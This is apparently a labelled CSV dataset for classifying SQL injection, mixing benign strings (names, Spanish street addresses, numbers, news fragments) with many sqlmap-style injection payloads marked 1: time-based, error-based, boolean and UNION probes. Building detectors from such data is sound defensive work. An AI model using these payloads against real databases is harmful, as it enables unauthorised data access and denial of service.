Sentence,Label
1356891564948898,0
1'|| ( select 'fwph' where 3791 = 3791,1
sikes-jeans@923.mv,0
"1  )  )   )  or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
1 and 4595 = 4595#,1
carson,0
 He said intended avoid contamination evidence &quot; overzealous &quot; poorly executed ,0
488u7ra,0
1 billion ,0
97060354d,0
6966,0
minuet salo,0
janti.quillan@messadivoce.tw,0
8629,0
3055509843252102,0
1'|| ( select 'fjlg' from dual where 9517 = 9517,1
 According State Government additional elective procedures largely reverse recent cuts ,0
2s323a657a679,0
schnirer,0
knippenberg@soyriojano.cf,0
 end and  ( 'rlux' like 'rlux,1
"1'  )  )   and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  'bzak' like 'bzak",1
92086641t,0
" The guide contains information schools make faculty staff aware children &apos;s food allergies , handle allergic reaction occur ",0
91,0
"1 )  as drbw where 2380 = 2380 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",1
"1%' or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
tejeda y segoyuela,0
signoret@pisossantcugat.cat,0
77452423s,0
" &quot; Gechingen: Absolute protection possible &quot; We want involve residents planning early stage possible , &quot; said Mayor Jens Häußler , opening citizen &apos;s information event regarding flood protection concept Gechingen ",0
25500,0
wilde@casasdefamosos.zw,0
c/ alcazalquivir s/n,0
"1'  )  )   )  and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1
dosenbac,0
gillespi,0
"la fragua 158, 11-e",0
hagerthy.gilling@inoxled.az,0
"1' where 4102 = 4102 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1
marcos esculta,0
1611608298925836,0
"1' )  as elnu where 5719 = 5719 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
schucrenberg-oheaney3@testdevelcidad.info,0
5176682769033876,0
verite@culturalsanpedrocf.dm,0
37788,0
"-3411'  )  )   )  union all select 3185,3185,3185,3185,3185,3185,3185,3185--",1
"1"" )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( ""otgh"" like ""otgh",1
solicitador,0
clarance6,0
"c/ fontanelles, 196,",0
" select * from users where id = 1 or 1#"". union select 'a',version (  )  -- 1",1
973,0
iafrate ciavaglia,0
"alqueria de pixarroda, 27",0
-4157' )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( 'rdhm' = 'rdhm,1
bazarjan,0
2892,0
1'  )  )   and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  'mmow' = 'mmow,1
"-7381'  )  )   or elt ( 5882 = 5919,5919 )  and   (  (  'nzri' = 'nzri",1
"1  )  )   )  union all select null,null,null,null,null,null#",1
1122690078978672,0
o+bispar,0
malen,0
" Governments , planning state start tracking miles driven every California motorist 2025 ",0
"1' where 4358 = 4358 union all select null,null,null,null--",1
"1' )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ",1
g0l4,0
1'  )  )   )  and  ( 3020 = 3020 ) *6703 and   (  (   ( 'nhrc' like 'nhrc,1
baily,0
"-1164"" )  union all select 6617,6617,6617,6617,6617,6617--",1
8324557940571698,0
mohedas de granadilla,0
keca@autoconstruccion.cu,0
4734,0
'sqlvuln,1
plmaces de jadraque,0
"1 where 7906 = 7906 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1
"1  )  )   or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and   (  (  9270 = 9270",1
"-3794' )  union all select 2485,2485,2485,2485,2485--",1
cabot@eurograb.tel,0
patrstica,0
" &quot; This expense offloaded , &quot; Maier glad say ",0
"-9615 )  as dntk where 4780 = 4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",1
"chorrito bajo, 11",0
"1' )  as cgsz where 7194 = 7194 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --",1
" Fenton animal mad - loves horses , tractors farms got two chickens looks ",0
0713886795207226,0
cuevas de san clemente,0
gates,0
0294331048003243,0
"1""  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( ""awyk"" like ""awyk",1
real de montroi,0
"1%' )  and elt ( 4670 = 9403,9403 )  and  ( '%' = '",1
1424,0
-8513 )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and  ( 5818 = 5818,1
"robledo, el",0
" select * from users where id = 1 or ""\#"" or 1 = 1 -- 1",1
"1 )  where 8734 = 8734 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1
08502321a,0
beaudine@barnizultravioleta.sz,0
cartagenero,0
zohar@pablobracamonte.bh,0
"1  )  )   as gobw where 3496 = 3496 union all select null,null,null,null,null,null,null,null,null--",1
bus ugartechea,0
naresh,0
08611,0
"1'+ ( select ummn where 8883 = 8883 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )    )  )  +'",1
casiodoro,0
""" )  or sleep ( __TIME__ )  = """,1
"-1663' or elt ( 1032 = 1032,3623 )  and 'yqaj' like 'yqaj",1
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay '0:0:2' --",1
" Instead gong dinner, let us hear whistle Spartan fife",0
"nuestra seora de la paz, 86, 2?a",0
orencio,0
"c/ virgen de la paloma, 107",0
"1"" )  as gjlv where 1983 = 1983 and sleep ( 5 ) #",1
25341,0
 end and   (  (  6874 = 6874,1
36844689t,0
calle siete cerros 144,0
"c/ jardins de caterina albert 149,",0
aun vilaregut,0
1%' and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
06405924x,0
lucidio,0
"1%""  )  )   and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"1"" )  where 5129 = 5129 order by 1--",1
"1 )  and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ",1
guoben,0
"1"" and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and ""wtkx"" = ""wtkx",1
" HSBC , Citigroup , JPMorgan Credit Suisse also launched internal probes received requests information regulators , said people familiar situation ",0
4365955387059187,0
"-9770'  )  )   as ovhh where 7903 = 7903 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --",1
"1 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
45373661c,0
0113026243246153,0
" However , Dick &apos;s story yet finished ",0
mackenna.papac@interpretacion-diccionario-y-significado-de-los-s,0
-9340 )  where 5462 = 5462 or 3038 = 3038,1
6317858667918423,0
" Her house located peaceful neighbourhood Stuttgart , plenty greenery , old tree population , nice neighbours much traffic ",0
-4001'  )  )   or 5634 = 4044--,1
"1'  )  )   )  and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'dsok' = 'dsok",1
"-7008'  )  )   union all select 9080,9080,9080#",1
18611,0
"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- zimf",1
"1"" )  where 3122 = 3122 and sleep ( 5 ) #",1
bolly,0
trombn,0
select  ( case when  ( 7997 = 1543 )  then 7997 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
"calle padre perpian, 90, 7-b",0
"1 where 6119 = 6119 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
arre,0
"1' where 9994 = 9994 and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"calle poligon industrial ""el segre"", 118",0
1423186093193887,0
70p89c9cion958,0
"-6007""  )  )   union all select 6019,6019,6019,6019,6019,6019,6019,6019--",1
"1'  )  )   )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and   (  (   ( 'zxhn' like 'zxhn",1
" Faced overwhelming match-determining performance , third set following somewhat tame spiritless performance , final score 3: 0 (25: 13 , 25: 14 , 25: 22)",0
iraci,0
nimia,0
"1', ( case when 5204 = 2136 then 1 else null end ) ",1
1' )  as ulbr where 7233 = 7233 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and 'tmdj' like 'tmdj",1
sldisk,0
pedralba de la pradera,0
65927228m,0
95,0
06390,0
davel,0
-9556 or  ( 2049 = 6967 ) *6967# mhbc,1
abdollah,0
 Learning rather unemployment: Tourism pilot project untrained A pilot project tourist industry launched today Mecklenburg lake district ,0
"1  )  )   as nnpe where 9720 = 9720 union all select null,null,null,null,null,null,null,null,null#",1
c09so18,0
conciliador,0
martens@ajuntamentbarcelona2-0.tl,0
de martino valds,0
6371,0
"-7001'+ ( select slav where 9321 = 9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",1
 One festival &apos;s biggest draws interview: David Steinberg talking Larry David ,0
darns cabrianes,0
"1""  )  )   )  and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( ""sajl"" = ""sajl",1
4927525514155816,0
"1 )  union all select null,null,null,null,null,null,null,null#",1
"-5187"" )  union all select 3373,3373#",1
31370,0
" Claire McCaskill , D-Mo ",0
yee,0
"c/ alcorac, 102",0
"1' )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( 'hfxu' like 'hfxu",1
" select * from users where id = 1 union select @<@.,version (  )  -- 1",1
" Snowden referred complex legal situation , Ströbele said ARD &apos;s &quot; Panorama &quot; programme ",0
"1' )  as gxpb where 7107 = 7107 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  --",1
violeta,0
64575959d,0
41,0
 select * from users where id = 1 +$ 1 or 1 = 1 -- 1,1
17773,0
1 )  as bhdj where 4472 = 4472,1
48064800k,0
"1' )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ",1
loktev@theroxyblue.aero,0
puente de montaana,0
"-9003""  )  )   union all select 9721,9721--",1
 The man &apos;s distraught nine-year-old son travelled Australia comforted since death father Wednesday adult cousin also vessel ,0
ibazeta montells,0
"1""  )  )   and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  ""ksrh"" = ""ksrh",1
sant andreu salou,0
6249,0
mcginnis-dellagnese@storagecraft.na,0
"1 )  where 1415 = 1415 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1
"-1947 union all select 7780,7780,7780,7780,7780,7780,7780,7780#",1
baos de ebro/maueta,0
cuad5in1m3o,0
"-4919 )  union all select 2608,2608,2608,2608,2608,2608#",1
 One thing I look forward every Halloween trends ,0
"-2417 )  union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",1
"1%""  )  )   )  or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
pasar por caja,0
"1'  )  )   as tfub where 3461 = 3461 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
knute,0
fundamentalmente,0
dugas,0
collazo fonts,0
select  ( case when  ( 2161 = 4328 )  then 2161 else 2161* ( select 2161 from mysql.db )  end ) #,1
escocia 197,0
7012,0
32806661j,0
" (2001), Liu et al",0
e_ncobador,0
28,0
paone,0
cheres ochoa,0
 It would thus suitable assist illegal immigration USA ,0
"1' )  where 3703 = 3703 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
" For large companies , message long since drummed home picking free USB stick trade fair , leaving laptop unguarded hotel room unwise , say least ",0
"-9934"" )  or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and  ( ""xecb"" like ""xecb",1
" select * from users where id = '1' + @ 1! union select 1,version (  )  -- 1'",1
"1' )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  ( 'zypa' = 'zypa",1
1'  )  )   and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (  'gjja' = 'gjja,1
"-6405 )  as ilah where 5145 = 5145 union all select 5145,5145,5145,5145,5145--",1
05200,0
"' )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1
"-9718%"" )  union all select 9515,9515,9515#",1
"calle padre arintero, 149",0
"-9408%""  )  )   union all select 1841,1841,1841,1841,1841,1841--",1
"-4148%""  )  )   )  or  ( 8459 = 8459 ) *4906 and   (  (   ( ""%"" = """,1
-2793' )  where 2621 = 2621 union all select 2621#,1
l0s4njear,0
"-3790"" )  as ojgb where 5925 = 5925 union all select 5925,5925#",1
a24030dor4,0
1' where 9206 = 9206,1
iorgo,0
ronendra,0
3155,0
09339,0
6015,0
"pasaje salas s/n, 7-f",0
 ( select  ( case when  ( 1570 = 6977 )  then 1 else 1570* ( select 1570 from mysql.db )  end  )  )  ,1
1 or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --,1
14188360m,0
4243993376239926,0
3213958805114016,0
rehbein,0
"jardines, 110",0
7895531711840476,0
"1"" where 9173 = 9173 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --",1
"1""  )  )   and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  ""jydy"" like ""jydy",1
0222583632895914,0
"1 where 7051 = 7051 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"1' )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
"c/ el jacinto, 132,",0
44194,0
2278515903267835,0
 Häußler made clear: &quot; The final decisions made members Town Council &quot; ,0
"1%'  )  )   )  or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
1  )  )   as dgso where 4654 = 4654 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) --,1
boreo@creacionesdolcevita.mo,0
7905893951677933,0
1681429677567137,0
6742076773015534,0
-1985  )  )   )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( 1248 = 1248,1
camila5,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   ) +'",1
1'+ ( select dklj where 3265 = 3265,1
"select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  (   ( 'squj' = 'squj",1
80819303v,0
polli7o,0
-4494 or 5291 = 4452,1
"granada, la",0
if ( 9953 = 4347 )  select 9953 else drop function ocau--,1
" end and   (  (  ""%"" = """,1
"torrent de can caralleu 48, 12-g",0
"plaza cinco villas, 103,",0
le8ru41,0
"calle barrio villayuda 169,",0
" According information police , 41-year-old Müsch travelling car Kempener bypass direction Grefrath , around 9",0
godiva,0
montseny,0
"admin"" )  or ""1"" = ""1""#",1
8755728520539974,0
"1 )  union all select null,null,null,null,null,null,null#",1
tapani9,0
14895436s,0
" At time , around 40 theology graduates begin vicars ",0
3313,0
"1%"" )  or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
abell segarras,0
"1""  )  )   as qgwq where 6122 = 6122",1
"1 )  where 3740 = 3740 union all select null,null,null,null,null,null,null,null--",1
"calle gola de perellonet, 196,",0
" In June , Rio suspended use railway week Renamo threatened attack line ",0
calle regimineto del sol 48 10e,0
"calle libertad, 133,",0
"1' in boolean mode )  and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
6h11a3rud9,0
l655a2uta,0
"1%'  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1' in boolean mode )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) #",1
 select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1,1
0345951332248071,0
6202740443449579,0
"1 )  union all select null,null,null,null,null,null#",1
"1"" )  and 2954 = 1256--",1
"asuncion castell, 17",0
47728723c,0
1' )  and sleep ( 5 )  and  ( 'orxt' = 'orxt,1
patchit,0
"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and 'ntaw' = 'ntaw",1
"1 where 5859 = 5859 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
 It makes yearn many promises disappeared ,0
"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",1
